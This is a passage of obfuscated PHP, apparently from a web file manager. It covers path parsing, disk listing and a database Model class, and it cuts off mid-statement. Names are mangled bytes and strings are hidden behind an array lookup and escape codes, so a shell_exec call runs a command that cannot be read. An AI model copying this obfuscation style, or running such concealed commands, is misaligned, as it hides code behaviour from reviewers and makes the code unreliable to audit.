clearEmptyFolder($¾ÊôßÊ×) { $†ÕÊ½¿Ò =& $_SERVER[ÏÒ Ì„]; if (trim($¾ÊôßÊ×, $†ÕÊ½¿Ò[8]) == trim(self::$_historyBase, $†ÕÊ½¿Ò[8])) { return; } $¬ÓË÷® = IO::pathFather($¾ÊôßÊ×); $õÅÛ¦‰ = IO::has($¾ÊôßÊ×, !0); if ($õÅÛ¦‰[$†ÕÊ½¿Ò[203]] > 0 || $õÅÛ¦‰[$†ÕÊ½¿Ò[204]] > 0) { return; } IO::remove($¾ÊôßÊ×); self::clearEmptyFolder($¬ÓË÷®); } private static function getBasePath() { $ÓÖê¢£µ =& $_SERVER[ÏÒ Ì„]; $áÆ Ÿãª = Model($ÓÖê¢£µ[1168])->get($ÓÖê¢£µ[1169]); if ($áÆ Ÿãª) { if (!IO::exist($áÆ Ÿãª)) { IO::mkdir($áÆ Ÿãª); } if (get_path_this($áÆ Ÿãª) == $ÓÖê¢£µ[1154]) { $èï§ªó = $ÓÖê¢£µ[1170] . rand_string(8); @rename($áÆ Ÿãª, get_path_father($áÆ Ÿãª) . $ÓÖê¢£µ[8] . $èï§ªó); $áÆ Ÿãª = DATA_PATH . $èï§ªó . $ÓÖê¢£µ[8]; file_put_contents(DATA_PATH . $ÓÖê¢£µ[1171], $ÓÖê¢£µ[33]); Model($ÓÖê¢£µ[1168])->set($ÓÖê¢£µ[1169], $áÆ Ÿãª); } return $áÆ Ÿãª; } $áÆ Ÿãª = DATA_PATH . $ÓÖê¢£µ[1170] . rand_string(8) . $ÓÖê¢£µ[8]; $áÆ Ÿãª = IO::mkdir($áÆ Ÿãª); $áÆ Ÿãª = rtrim($áÆ Ÿãª, $ÓÖê¢£µ[8]) . $ÓÖê¢£µ[8]; file_put_contents($áÆ Ÿãª . $ÓÖê¢£µ[1171], $ÓÖê¢£µ[33]); file_put_contents(DATA_PATH . $ÓÖê¢£µ[1171], $ÓÖê¢£µ[33]); Model($ÓÖê¢£µ[1168])->set($ÓÖê¢£µ[1169], $áÆ Ÿãª); return $áÆ Ÿãª; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\x52\145\x63\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\x72\106\151\x6c\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\162\x46\x69\x6c\x65\x54\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\165\x70\122\x6f\x6f\x74\x53\145\x6c\x66\175"; const KOD_USER_SHARE = "\173\x75\x73\145\162\123\150\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\123\x68\x61\x72\145\114\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\162\x65\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\x65\x49\164\145\155\175"; const KOD_SHARE_LINK = "\x7b\x73\150\141\x72\x65\111\x74\x65\155\x4c\151\x6e\153\175"; const KOD_SEARCH = "\x7b\163\x65\141\162\x63\150\175"; const KOD_BLOCK = "\173\142\x6c\x6f\x63\x6b\x7d"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\173\165\x73\x65\162\122\x65\156\x63\x65\156\164\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\x69\166\x65\x72\175"; public static function typeList() { $ş¶Ï‰µ =& $_SERVER[ÏÒ Ì„]; return array($ş¶Ï‰µ[1172] => self::KOD_SOURCE, $ş¶Ï‰µ[1173] => self::KOD_USER_RECYCLE, $ş¶Ï‰µ[1174] => self::KOD_USER_FAV, $ş¶Ï‰µ[1175] => self::KOD_USER_FILE_TAG, $ş¶Ï‰µ[1176] => self::KOD_USER_FILE_TYPE, $ş¶Ï‰µ[1177] => self::KOD_GROUP_ROOT_SELF, $ş¶Ï‰µ[1178] => self::KOD_USER_SHARE, $ş¶Ï‰µ[1179] => self::KOD_USER_SHARE_LINK, $ş¶Ï‰µ[1180] => self::KOD_USER_SHARE_TO_ME, $ş¶Ï‰µ[1181] => self::KOD_SHARE_ITEM, $ş¶Ï‰µ[1182] => self::KOD_SHARE_LINK, $ş¶Ï‰µ[1183] => self::KOD_SEARCH, $ş¶Ï‰µ[1184] => self::KOD_BLOCK, $ş¶Ï‰µ[1185] => self::KOD_IO, $ş¶Ï‰µ[1186] => self::KOD_USER_RECENT, $ş¶Ï‰µ[1187] => self::KOD_USER_DRIVER); } public static function parse($ªŞÁşİ˜) { $•ÁÈÕÔˆ =& $_SERVER[ÏÒ Ì„]; $ªŞÁşİ˜ = self::clear($ªŞÁşİ˜); $£Ã³îĞš = array_values(self::typeList()); preg_match($•ÁÈÕÔˆ[1188], $ªŞÁşİ˜, $„Ÿ°éãú); $èÇßİÄ = array($•ÁÈÕÔˆ[417] => !1, $•ÁÈÕÔˆ[1189] => !1, $•ÁÈÕÔˆ[414] => !1, $•ÁÈÕÔˆ[76] => $ªŞÁşİ˜, $•ÁÈÕÔˆ[1098] => !1, $•ÁÈÕÔˆ[1097] => $•ÁÈÕÔˆ[33]); if (is_array($„Ÿ°éãú) && count($„Ÿ°éãú) == 5) { $˜ òÈ = $•ÁÈÕÔˆ[1190] . $„Ÿ°éãú[2] . $•ÁÈÕÔˆ[325]; if (in_array($˜ òÈ, $£Ã³îĞš)) { $èÇßİÄ[$•ÁÈÕÔˆ[1098]] = $„Ÿ°éãú[1]; $èÇßİÄ[$•ÁÈÕÔˆ[29]] = $˜ òÈ; $èÇßİÄ[$•ÁÈÕÔˆ[1191]] = substr($˜ òÈ, 1, -1); $èÇßİÄ[$•ÁÈÕÔˆ[395]] = $„Ÿ°éãú[3]; } $èÇßİÄ[$•ÁÈÕÔˆ[1097]] = $„Ÿ°éãú[4]; } $¢æÌÖîö = array($•ÁÈÕÔˆ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $èÇßİÄ[$•ÁÈÕÔˆ[1153]] = in_array($èÇßİÄ[$•ÁÈÕÔˆ[29]], $¢æÌÖîö); return $èÇßİÄ; } public static function isTruePath($èÙ†”‚Ù) { $™÷Æ =& $_SERVER[ÏÒ Ì„]; if (substr($èÙ†”‚Ù, 0, 1) != $™÷Æ[1190]) { return !0; } if (strpos($èÙ†”‚Ù, $™÷Æ[403]) === 0) { return !0; } if (strpos($èÙ†”‚Ù, $™÷Æ[1157]) === 0) { return !0; } if (strpos($èÙ†”‚Ù, $™÷Æ[1192]) === 0) { return !0; } if (strpos($èÙ†”‚Ù, $™÷Æ[1193]) === 0) { return !0; } if (strpos($èÙ†”‚Ù, $™÷Æ[1194]) === 0) { return !0; } return !1; } public static function clear($ù÷çËÜ€) { $ÍÉ¸äÎ„ =& $_SERVER[ÏÒ Ì„]; $ù÷çËÜ€ = str_replace(array($ÍÉ¸äÎ„[1071], $ÍÉ¸äÎ„[229]), $ÍÉ¸äÎ„[50], $ù÷çËÜ€); $ù÷çËÜ€ = str_replace($ÍÉ¸äÎ„[97], $ÍÉ¸äÎ„[8], $ù÷çËÜ€); $ÓË­ŞÔ÷ = $ÍÉ¸äÎ„[1195]; if (substr($ù÷çËÜ€, 0, 3) == $ÍÉ¸äÎ„[1196]) { $ù÷çËÜ€ = substr($ù÷çËÜ€, 3); } while (strstr($ù÷çËÜ€, $ÓË­ŞÔ÷)) { $ù÷çËÜ€ = str_replace($ÓË­ŞÔ÷, $ÍÉ¸äÎ„[8], $ù÷çËÜ€); } $ù÷çËÜ€ = preg_replace($ÍÉ¸äÎ„[1197], $ÍÉ¸äÎ„[8], $ù÷çËÜ€); if ($ù÷çËÜ€ == $ÍÉ¸äÎ„[8]) { return $ÍÉ¸äÎ„[8]; } $ù÷çËÜ€ = rtrim($ù÷çËÜ€, $ÍÉ¸äÎ„[8]); return $ù÷çËÜ€; } public static function sourceID($Œí×‡ş) { $Ÿ­áèÛ« =& $_SERVER[ÏÒ Ì„]; $Üˆ£Å‡¿ = self::parse($Œí×‡ş); if ($Üˆ£Å‡¿[$Ÿ­áèÛ«[29]] !== self::KOD_SOURCE) { show_json(LNG($Ÿ­áèÛ«[1198]), !1); } return $Üˆ£Å‡¿[$Ÿ­áèÛ«[395]]; } public static function make($´½ğ°Ñ±) { if (!$´½ğ°Ñ±) { return !1; } return self::makePath(self::KOD_SOURCE, intval($´½ğ°Ñ±)); } public static function makeShare($¿£Šû•, $Î®Ú€Êï) { return self::makePath(self::KOD_SHARE_ITEM, $¿£Šû•, $Î®Ú€Êï); } public static function makeFileTypePath($‘†ß¯Êş) { return self::makePath(self::KOD_USER_FILE_TYPE, $‘†ß¯Êş); } public static function makeFileTagPath($Ã¾‹®óõ) { return self::makePath(self::KOD_USER_FILE_TAG, $Ã¾‹®óõ); } public static function makePath($îÏİ–Õ, $‚ÌÈ‘®Û = '', $¯ñÖ¢îº = '') { $ƒéêñÉ =& $_SERVER[ÏÒ Ì„]; $‹”„ÑÑ‡ = substr($îÏİ–Õ, 1, -1); $¢á¹×µ = $ƒéêñÉ[1199] . $‹”„ÑÑ‡ . $ƒéêñÉ[1200] . $‚ÌÈ‘®Û . $ƒéêñÉ[1201]; $¢á¹×µ = $¯ñÖ¢îº ? $¢á¹×µ . $¯ñÖ¢îº . $ƒéêñÉ[8] : $¢á¹×µ; return $¢á¹×µ; } public static function hashPath($èÙ¤Ê¾½, $¹î¼Áí = true) { $˜›Ì«Æ„ =& $_SERVER[ÏÒ Ì„]; $÷îüªÆ­ = is_array($èÙ¤Ê¾½) ? $èÙ¤Ê¾½ : IO::info($èÙ¤Ê¾½); $©ôÔßµ¿ = _get($÷îüªÆ­, $˜›Ì«Æ„[1202], $˜›Ì«Æ„[33]); if (!$©ôÔßµ¿ && isset($÷îüªÆ­[$˜›Ì«Æ„[397]])) { $÷îüªÆ­ = IO::info(KodIO::make($÷îüªÆ­[$˜›Ì«Æ„[397]])); $©ôÔßµ¿ = _get($÷îüªÆ­, $˜›Ì«Æ„[1202], $˜›Ì«Æ„[33]); } if (!$©ôÔßµ¿ && $¹î¼Áí) { $ÂáÎèì› = KodIO::parse($÷îüªÆ­[$˜›Ì«Æ„[76]]); if (!$ÂáÎèì›[$˜›Ì«Æ„[29]]) { $©ôÔßµ¿ = IO::hashSimple($÷îüªÆ­[$˜›Ì«Æ„[76]]); } } if (!$©ôÔßµ¿) { $©ôÔßµ¿ = md5($÷îüªÆ­[$˜›Ì«Æ„[76]] . $÷îüªÆ­[$˜›Ì«Æ„[78]] . $÷îüªÆ­[$˜›Ì«Æ„[84]]); } return $©ôÔßµ¿; } public static function initSystemPath() { $Â•©æô• =& $_SERVER[ÏÒ Ì„]; if (defined($Â•©æô•[1203])) { return; } define($Â•©æô•[1203], self::systemPath($Â•©æô•[1204])); define($Â•©æô•[1205], self::systemPath($Â•©æô•[1206])); define($Â•©æô•[1207], self::systemPath($Â•©æô•[1208])); define($Â•©æô•[1209], self::systemPath($Â•©æô•[1210])); IOHistory::bindEvent(); } public static function systemPath($€æ’ş¼‚) { $£¹ô»Ÿ  =& $_SERVER[ÏÒ Ì„]; $ÃÈ×Ä¹× = $£¹ô»Ÿ [1211] . ucfirst($€æ’ş¼‚); $¼ëñ€¾Ï = Model($£¹ô»Ÿ [760])->get($ÃÈ×Ä¹×); if ($¼ëñ€¾Ï) { return $¼ëñ€¾Ï; } if ($€æ’ş¼‚ == $£¹ô»Ÿ [1204]) { $¼ëñ€¾Ï = self::make(Model($£¹ô»Ÿ [822])->systemRootPathAdd($£¹ô»Ÿ [531])); } else { $¼ëñ€¾Ï = self::systemPath($£¹ô»Ÿ [1204]); $éÏÌÚçò = self::sourceID($¼ëñ€¾Ï); $¼ëñ€¾Ï = self::make(Model($£¹ô»Ÿ [822])->mkdir($éÏÌÚçò, $€æ’ş¼‚)); } Model($£¹ô»Ÿ [760])->set($ÃÈ×Ä¹×, $¼ëñ€¾Ï); return $¼ëñ€¾Ï; } public static function systemFolder($Ş–ĞŸéŒ) { $©Êîİ™± = IO_PATH_SYSTEM_SOURCE . $Ş–ĞŸéŒ; $¿Ş€±¤¬ = Cache::get($©Êîİ™±); if (!$¿Ş€±¤¬) { $ˆ¦­¶ªæ = IO::infoFull($©Êîİ™±); if (!$ˆ¦­¶ªæ) { $¿Ş€±¤¬ = IO::mkdir($©Êîİ™±, REPEAT_SKIP); } else { $¿Ş€±¤¬ = $ˆ¦­¶ªæ[$_SERVER[ÏÒ Ì„][76]]; } Cache::set($©Êîİ™±, $¿Ş€±¤¬, 3600 * 10); } return $¿Ş€±¤¬; } public static function defaultDriver() { return Model($_SERVER[ÏÒ Ì„][757])->defaultDriver(); } public static function defaultIO() { $‚š×¦¹ =& $_SERVER[ÏÒ Ì„]; $ã¥¤ÄØ• = self::defaultDriver(); return $‚š×¦¹[1212] . $ã¥¤ÄØ•[$‚š×¦¹[395]] . $‚š×¦¹[1201]; } public static function defaultDriverInit() { static $³€€ğ— = false; if ($³€€ğ—) { return $³€€ğ—; } $³€€ğ— = IO::init(self::defaultIO()); return $³€€ğ—; } public static function fileTypeList() { $‰Ïö”Á =& $_SERVER[ÏÒ Ì„]; $’¶êş = $GLOBALS[$‰Ïö”Á[6]][$‰Ïö”Á[1213]]; foreach ($’¶êş as $é™˜íÙï => $Ã×íöƒ²) { $°½ªÈÂğ = $‰Ïö”Á[1214] . $é™˜íÙï; $˜ƒÔÀºî = LNG($°½ªÈÂğ); if ($°½ªÈÂğ != $˜ƒÔÀºî) { $’¶êş[$é™˜íÙï][$‰Ïö”Á[28]] = $˜ƒÔÀºî; } } return $’¶êş; } public static function diskList($Á˜ÙŸ•Ø = true) { $óÜÈæ· = $_SERVER[ÏÒ Ì„][1215]; if ($Á˜ÙŸ•Ø) { $§÷Ê¦·ò = Cache::get($óÜÈæ·); if (is_array($§÷Ê¦·ò)) { return $§÷Ê¦·ò; } } $§÷Ê¦·ò = self::diskListGet(); Cache::set($óÜÈæ·, $§÷Ê¦·ò, 3600); return $§÷Ê¦·ò; } public static function diskListGet() { $ßæÂæÈ× =& $_SERVER[ÏÒ Ì„]; $Á©ÇÜõ = array(); if ($GLOBALS[$ßæÂæÈ×[6]][$ßæÂæÈ×[1216]] == $ßæÂæÈ×[1217]) { $ì˜½ßšì = $ßæÂæÈ×[1218]; for ($ÆòûëßÙ = 0; $ÆòûëßÙ < strlen($ì˜½ßšì); $ÆòûëßÙ++) { $Ü‚¦”Øç = $ì˜½ßšì[$ÆòûëßÙ] . $ßæÂæÈ×[1219]; if (file_exists($Ü‚¦”Øç)) { $Á©ÇÜõ[] = $Ü‚¦”Øç; } } return $Á©ÇÜõ; } if (!function_exists($ßæÂæÈ×[98])) { $Á©ÇÜõ[] = $ßæÂæÈ×[832]; return $Á©ÇÜõ; } $±ÍÂ´ÎÕ = explode($ßæÂæÈ×[229], shell_exec($ßæÂæÈ×[1220])); array_shift($±ÍÂ´ÎÕ); array_pop($±ÍÂ´ÎÕ); $±­ˆ¢Ò = array($ßæÂæÈ×[1221], $ßæÂæÈ×[1222], $ßæÂæÈ×[1223], $ßæÂæÈ×[1224]); foreach ($±ÍÂ´ÎÕ as $ƒğ¼á‘Û) { $¢¡½ò÷ = preg_split($ßæÂæÈ×[1225], $ƒğ¼á‘Û); $Ü‚¦”Øç = $¢¡½ò÷[count($¢¡½ò÷) - 1]; if (!strstr($¢¡½ò÷[0], $ßæÂæÈ×[1226])) { continue; } if (!$Ü‚¦”Øç || in_array($Ü‚¦”Øç, $±­ˆ¢Ò)) { continue; } $Á©ÇÜõ[] = rtrim($Ü‚¦”Øç, $ßæÂæÈ×[8]) . $ßæÂæÈ×[8]; } return $Á©ÇÜõ; } public static function isSameDisk($Ç²šĞåÕ, $ĞÓã—±®) { $˜ÉóàñË =& $_SERVER[ÏÒ Ì„]; if ($GLOBALS[$˜ÉóàñË[6]][$˜ÉóàñË[1216]] == $˜ÉóàñË[1217]) { return strtolower(substr($Ç²šĞåÕ, 0, 1)) == strtolower(substr($ĞÓã—±®, 0, 1)); } $Œ’×ĞÄ« = self::diskList(); $’ƒ„÷¥  = !1; $®ß¬ÖÃ = !1; sort($Œ’×ĞÄ«); $Œ’×ĞÄ« = array_reverse($Œ’×ĞÄ«); $Ç²šĞåÕ = rtrim($Ç²šĞåÕ, $˜ÉóàñË[8]) . $˜ÉóàñË[8]; $ĞÓã—±® = rtrim($ĞÓã—±®, $˜ÉóàñË[8]) . $˜ÉóàñË[8]; foreach ($Œ’×ĞÄ« as $±½ñÛ²) { $¦â†µµö = strlen($±½ñÛ²); if (!$’ƒ„÷¥  && substr($Ç²šĞåÕ, 0, $¦â†µµö) == $±½ñÛ²) { $’ƒ„÷¥  = $±½ñÛ²; } if (!$®ß¬ÖÃ && substr($ĞÓã—±®, 0, $¦â†µµö) == $±½ñÛ²) { $®ß¬ÖÃ = $±½ñÛ²; } if ($’ƒ„÷¥  && $®ß¬ÖÃ) { break; } } return $’ƒ„÷¥  === $®ß¬ÖÃ; } public static function transferType($ˆÜ‹Œà, $¢¦²ÛÀØ) { $á¡ëí” =& $_SERVER[ÏÒ Ì„]; $¤ÑÏŠ—Í = self::driverType($ˆÜ‹Œà); $á´êõš = self::driverType($¢¦²ÛÀØ); if ($¤ÑÏŠ—Í[$á¡ëí”[29]] == $á´êõš[$á¡ëí”[29]] && $¤ÑÏŠ—Í[$á¡ëí”[1227]] == $á´êõš[$á¡ëí”[1227]]) { return $á¡ëí”[1228]; } if ($¤ÑÏŠ—Í[$á¡ëí”[29]] == $á¡ëí”[861] && $á´êõš[$á¡ëí”[29]] == $á¡ëí”[106]) { return $á¡ëí”[1127]; } if ($¤ÑÏŠ—Í[$á¡ëí”[29]] == $á¡ëí”[106] && $á´êõš[$á¡ëí”[29]] == $á¡ëí”[861]) { return $á¡ëí”[107]; } return $á¡ëí”[1229]; } public static function driverType($¦ê‘ñÙÈ) { $×æº®ì¨ =& $_SERVER[ÏÒ Ì„]; $¥§ßûÊ = str_replace($×æº®ì¨[1230], $×æº®ì¨[33], strtolower($¦ê‘ñÙÈ->getType())); if ($¥§ßûÊ == $×æº®ì¨[748] || $¥§ßûÊ == $×æº®ì¨[1231] || $¥§ßûÊ == $×æº®ì¨[1232]) { $¦ê‘ñÙÈ = self::defaultDriverInit(); } else { if ($¥§ßûÊ == $×æº®ì¨[1134] || $¥§ßûÊ == $×æº®ì¨[1233]) { $¦ê‘ñÙÈ = IO::init($¦ê‘ñÙÈ->pathParse[$×æº®ì¨[1081]]); } } $©Â¸“ = $¦ê‘ñÙÈ->path; $¥§ßûÊ = str_replace($×æº®ì¨[1230], $×æº®ì¨[33], strtolower($¦ê‘ñÙÈ->getType())); if ($¥§ßûÊ == $×æº®ì¨[106]) { return array($×æº®ì¨[29] => $×æº®ì¨[106], $×æº®ì¨[1227] => $×æº®ì¨[33], $×æº®ì¨[76] => $©Â¸“); } return array($×æº®ì¨[29] => $×æº®ì¨[861], $×æº®ì¨[1227] => $¦ê‘ñÙÈ->pathDriver, $×æº®ì¨[76] => $©Â¸“); } public static function pathDriverType($³›†ÈĞà) { return $³›†ÈĞà ? self::driverType(IO::init($³›†ÈĞà)) : !1; } } goto FÛÒ±±¿á„; DÙè¾ô¢¹Ÿ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\x6f\x72\x64\x65\162", "\x61\x6c\151\x61\x73", "\x68\141\x76\x69\156\147", "\x67\162\x6f\x75\160", "\x6c\x6f\143\153", "\x64\151\x73\164\151\x6e\x63\x74", "\141\x75\164\x6f", "\146\151\x6c\x74\145\162", "\x76\x61\154\x69\144\x61\164\145", "\x72\x65\x73\x75\154\164", "\x62\151\x6e\144", "\164\157\153\145\156"); public function __construct($Ã¤³¼Ùš = '', $²ÜŞ†©û = '', $ü‘©¼Ò = '') { $å’©Ê¥É =& $_SERVER[ÏÒ Ì„]; $this->_initialize(); if (!empty($Ã¤³¼Ùš)) { if (strpos($Ã¤³¼Ùš, $å’©Ê¥É[95])) { list($this->dbName, $this->name) = explode($å’©Ê¥É[95], $Ã¤³¼Ùš); } else { $this->name = $Ã¤³¼Ùš; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($²ÜŞ†©û)) { $this->tablePrefix = $å’©Ê¥É[33]; } elseif ($å’©Ê¥É[33] != $²ÜŞ†©û) { $this->tablePrefix = $²ÜŞ†©û; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($å’©Ê¥É[242]); } $this->db(0, empty($this->connection) ? $ü‘©¼Ò : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $®Áªíı© =& $_SERVER[ÏÒ Ì„]; if (empty($this->fields)) { if (think_config($®Áªíı©[243])) { $Ä©Å„ş = $this->dbName ? $this->dbName : think_config($®Áªíı©[244]); $“—¡ÊÁÂ = think_var_cache($®Áªíı©[245] . strtolower(get_path_this($Ä©Å„ş) . $®Áªíı©[95] . $this->name)); if ($“—¡ÊÁÂ) { $é·Î§õ§ = think_config($®Áªíı©[246]); if (empty($é·Î§õ§) || $“—¡ÊÁÂ[$®Áªíı©[247]] == $é·Î§õ§) { $this->fields = $“—¡ÊÁÂ; return; } } } $this->flush(); } } public function flush() { $ÅÃø´Èí =& $_SERVER[ÏÒ Ì„]; $this->db->setModel($this->name); $÷ßË«Á× = $this->db->getFields($this->getTableName()); if (!$÷ßË«Á×) { return !1; } $this->fields = array_keys($÷ßË«Á×); $this->fields[$ÅÃø´Èí[248]] = !1; foreach ($÷ßË«Á× as $ä…Çˆó => $ «Õ–«Ù) { $¶¾€ÊĞ‡[$ä…Çˆó] = $ «Õ–«Ù[$ÅÃø´Èí[29]]; if ($ «Õ–«Ù[$ÅÃø´Èí[36]]) { $this->fields[$ÅÃø´Èí[249]] = $ä…Çˆó; if ($ «Õ–«Ù[$ÅÃø´Èí[39]]) { $this->fields[$ÅÃø´Èí[248]] = !0; } } } $this->fields[$ÅÃø´Èí[250]] = $¶¾€ÊĞ‡; if (think_config($ÅÃø´Èí[246])) { $this->fields[$ÅÃø´Èí[247]] = think_config($ÅÃø´Èí[246]); } if (think_config($ÅÃø´Èí[243])) { $‡ßó«÷ = $this->dbName ? $this->dbName : think_config($ÅÃø´Èí[244]); think_var_cache($ÅÃø´Èí[245] . strtolower(get_path_this($‡ßó«÷) . $ÅÃø´Èí[95] . $this->name), $this->fields); } } public function switchModel($Ü•·œ®´, $ŒÂé§×é = array()) { $Ê©ÅıÓ =& $_SERVER[ÏÒ Ì„]; $İÑ‚ææ• = ucwords(strtolower($Ü•·œ®´)) . $Ê©ÅıÓ[251]; if (!class_exists($İÑ‚ææ•)) { think_exception($İÑ‚ææ• . think_lang($Ê©ÅıÓ[252])); } $this->_extModel = new $İÑ‚ææ•($this->name); if (!empty($ŒÂé§×é)) { foreach ($ŒÂé§×é as $àğ¶¦Â¬) { $this->_extModel->setProperty($àğ¶¦Â¬, $this->{$àğ¶¦Â¬}); } } return $this->_extModel; } public function __set($‡íÅıÆ¯, $øáàŞÊ) { $this->data[$‡íÅıÆ¯] = $øáàŞÊ; } public function __get($“ÉÜ£¶¦) { return isset($this->data[$“ÉÜ£¶¦]) ? $this->data[$“ÉÜ£¶¦] : null; } public function __isset($¢íÀòÊ½) { return isset($this->data[$¢íÀòÊ½]); } public function __unset($ÖàáÀÒ‘) { unset($this->data[$ÖàáÀÒ‘]); } public function __call($†“Ãı­, $ˆùÇëø) { $ÃÜƒòù =& $_SERVER[ÏÒ Ì„]; if (in_array(strtolower($†“Ãı­), $this->methods, !0)) { $this->options[strtolower($†“Ãı­)] = $ˆùÇëø[0]; return $this; } elseif (in_array(strtolower($†“Ãı­), array($ÃÜƒòù[253], $ÃÜƒòù[254], $ÃÜƒòù[255], $ÃÜƒòù[256], $ÃÜƒòù[257]), !0)) { $ßèçÇß› = isset($ˆùÇëø[0]) ? $ˆùÇëø[0] : $ÃÜƒòù[182]; $ßèçÇß› = $this->db->parseKey($ßèçÇß›); return $this->getField(strtoupper($†“Ãı­) . $ÃÜƒòù[258] . $ßèçÇß› . $ÃÜƒòù[259] . $†“Ãı­, $ÃÜƒòù[253]); } elseif (strtolower(substr($†“Ãı­, 0, 5)) == $ÃÜƒòù[260]) { $ßèçÇß› = think_parse_name(substr($†“Ãı­, 5)); $Ø ×¿[$ßèçÇß›] = $ˆùÇëø[0]; return $this->where($Ø ×¿)->find(); } elseif (strtolower(substr($†“Ãı­, 0, 10)) == $ÃÜƒòù[261]) { $Ëšò»œç = think_parse_name(substr($†“Ãı­, 10)); $Ø ×¿[$Ëšò»œç] = $ˆùÇëø[0]; return $this->where($Ø ×¿)->getField($ˆùÇëø[1]); } elseif (isset($this->_scope[$†“Ãı­])) { return $this->scope($†“Ãı­, $ˆùÇëø[0]); } elseif (method_exists($this, $†“Ãı­)) { array_unshift($ˆùÇëø, $†“Ãı­); return call_user_func_array(array($this, $ÃÜƒòù[262]), $ˆùÇëø); } else { return call_user_func_array(array(parent, $†“Ãı­), $ˆùÇëø); } } protected function call() { $ãœÖ§šù =& $_SERVER[ÏÒ Ì„]; $é…×áÚü = func_get_args(); $•˜’Ñó = array_shift($é…×áÚü); $–Ï”ú¤© = $•˜’Ñó; if (is_array($•˜’Ñó)) { $–Ï”ú¤© = $•˜’Ñó[1]; $•˜’Ñó = $•˜’Ñó[0]; } $¦…äÕ¿õ = count($é…×áÚü) - 1; if (isset($é…×áÚü[$¦…äÕ¿õ]) && $é…×áÚü[$¦…äÕ¿õ] === $•˜’Ñó) { think_exception(__CLASS__ . $ãœÖ§šù[4] . $•˜’Ñó . think_lang($ãœÖ§šù[263])); return; } $é…×áÚü[] = $•˜’Ñó; if (method_exists($this, $ãœÖ§šù[264])) { $©ØªÖÏ¦ = call_user_func_array(array($this, $ãœÖ§šù[265]), array($–Ï”ú¤©, $é…×áÚü)); if (!is_null($©ØªÖÏ¦) && $©ØªÖÏ¦ !== !1) { return $©ØªÖÏ¦; } } $Å¨Ûé© = call_user_func_array(array($this, $•˜’Ñó), $é…×áÚü); if (method_exists($this, $ãœÖ§šù[266])) { $©ØªÖÏ¦ = call_user_func_array(array($this, $ãœÖ§šù[267]), array($–Ï”ú¤©, $é…×áÚü, $Å¨Ûé©)); if ($©ØªÖÏ¦) { return $©ØªÖÏ¦; } } return $Å¨Ûé©; } protected function _initialize() { } protected function _facade($ˆ¦àÏ) { $ÜÉ¾¿èé =& $_SERVER[ÏÒ Ì„]; if (!empty($this->fields)) { foreach ($ˆ¦àÏ as $ÌûĞ â => $â¬Œ‘Ñ) { if (is_array($this->fields) && !in_array($ÌûĞ â, $this->fields, !0)) { unset($ˆ¦àÏ[$ÌûĞ â]); } elseif (is_scalar($â¬Œ‘Ñ)) { $this->_parseType($ˆ¦àÏ, $ÌûĞ â); } } } if (!empty($this->options[$ÜÉ¾¿èé[268]])) { $ˆ¦àÏ = array_map($this->options[$ÜÉ¾¿èé[268]], $ˆ¦àÏ); unset($this->options[$ÜÉ¾¿èé[268]]); } $this->_beforeWrite($ˆ¦àÏ); return $ˆ¦àÏ; } protected function _beforeWrite(&$óÔóØôÙ) { } public function add($çïÍ²ûĞ = '', $õ“øå Æ = array(), $„×¹«“ = false) { if (empty($çïÍ²ûĞ)) { if (!empty($this->data)) { $çïÍ²ûĞ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÏÒ Ì„][269]); return !1; } } $õ“øå Æ = $this->_parseOptions($õ“øå Æ); $çïÍ²ûĞ = $this->_facade($çïÍ²ûĞ); if (!1 === $this->_beforeInsert($çïÍ²ûĞ, $õ“øå Æ)) { return !1; } $×ä•¥¼ˆ = $this->db->insert($çïÍ²ûĞ, $õ“øå Æ, $„×¹«“); if (!1 !== $×ä•¥¼ˆ) { $£¤ıÁ®Ä = $this->getLastInsID(); if ($£¤ıÁ®Ä) { $çïÍ²ûĞ[$this->getPk()] = $£¤ıÁ®Ä; $this->_after_insert($çïÍ²ûĞ, $õ“øå Æ); return $£¤ıÁ®Ä; } $this->_after_insert($çïÍ²ûĞ, $õ“øå Æ); } return $×ä•¥¼ˆ; } protected function _beforeInsert(&$ä©ŞÓèÍ, $¹ñ÷¨Æ) { } protected function _after_insert($èøóƒ¬Ğ, $şÉ²á Ä) { } public function addAll($¦Á×¨ÅŒ, $É¶ ²›¡ = array(), $àüŸÊÕ¼ = false) { $‚ÁÔ„ê˜ =& $_SERVER[ÏÒ Ì„]; if (empty($¦Á×¨ÅŒ)) { $this->error = think_lang($‚ÁÔ„ê˜[269]); return !1; } $É¶ ²›¡ = $this->_parseOptions($É¶ ²›¡); foreach ($¦Á×¨ÅŒ as $Ê§Ê¥Á => $¨¯¼éºò) { $¦Á×¨ÅŒ[$Ê§Ê¥Á] = $this->_facade($¨¯¼éºò); } if (method_exists($this->db, $‚ÁÔ„ê˜[270])) { $üÔ”ô‘Ä = $this->db->insertAll($¦Á×¨ÅŒ, $É¶ ²›¡, $àüŸÊÕ¼); } else { $this->startTrans(); foreach ($¦Á×¨ÅŒ as $Ê§Ê¥Á => $¨¯¼éºò) { $üÔ”ô‘Ä = 